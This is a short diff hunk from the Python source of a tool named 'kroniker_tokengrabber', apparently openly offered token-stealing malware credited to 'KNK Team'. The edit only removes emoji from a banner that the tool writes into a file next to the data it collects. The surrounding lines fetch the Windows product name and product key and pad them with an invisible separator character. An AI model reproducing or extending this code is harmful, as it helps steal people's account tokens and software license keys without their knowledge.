@@ -411,10 +411,10 @@ class kroniker_tokengrabber(functions):
                     else:
                         with open(path, "w", encoding="utf-8", errors="ignore") as f:
                             f.write(
-                                "👑・TokenGabber By KNK Team・https://github.com/KRONIKER-KNK/TokenGrabber/main.py\n\n")
+                                "TokenGabber By KNK Team https://github.com/KRONIKER-KNK/TokenGrabber/main.py\n\n")
                         with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                             fp.write(
-                                x+"\n\n👑・TokenGabber By KNK Team・https://github.com/KRONIKER-KNK/TokenGrabber/main.py")
+                                x+"\n\nTokenGabber By KNK Team https://github.com/KRONIKER-KNK/TokenGrabber/main.py")
         w = self.getProductValues()
         wname = w[0].replace(" ", "᠎ ")
         wkey = w[1].replace(" ", "᠎ ")
